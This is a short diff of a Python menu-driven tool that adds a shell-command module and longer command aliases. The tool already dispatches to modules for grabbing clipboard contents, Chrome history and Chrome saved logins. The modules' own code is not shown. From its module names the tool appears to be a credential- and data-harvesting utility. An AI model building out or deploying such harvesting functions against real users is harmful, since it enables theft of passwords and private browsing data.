@@ -5,11 +5,13 @@ from modules import mod_hello
 from modules import mod_clipboard
 from modules import mod_chrome_history
 from modules import mod_chrome_logins
+from modules import mod_shellcmd
 
 mymod = mod_hello.mod_hello()
 mymodclip = mod_clipboard.mod_clipboard()
 mymodchromehist = mod_chrome_history.mod_chrome_history()
 mymodchromelogins = mod_chrome_logins.mod_chrome_logins()
+mymodshellcmd = mod_shellcmd.mod_shellcmd()
 
 authorName = "JeteDonner"
 appVer = "0.0.1"
@@ -32,16 +34,20 @@ def print_help():
     print(f'#========================================================================#')
 
 def processInput(input):
-    if input == "q":
+    if input == "q" or input == "quit":
         sys.exit(1)
-    elif input == "c":
+    elif input == "h" or input == "help":
+        print_help()
+    elif input == "c" or input == "clipboard":
         mymodclip.run_mod()
-    elif input == "ch":
+    elif input == "ch" or input == "chromeHistory":
         mymodchromehist.run_mod()
-    elif input == "cl":
+    elif input == "cl" or input == "chromeLogins":
         mymodchromelogins.run_mod()
-    elif input == "d":
-        mymodchromelogins.run_mod()
+    elif input == "s" or input == "shell":
+        mymodshellcmd.run_mod()
+    elif input == "d" or input == "dev":
+        mymodshellcmd.run_mod()
 
 def enterWaitForInput(argv):
     while True:
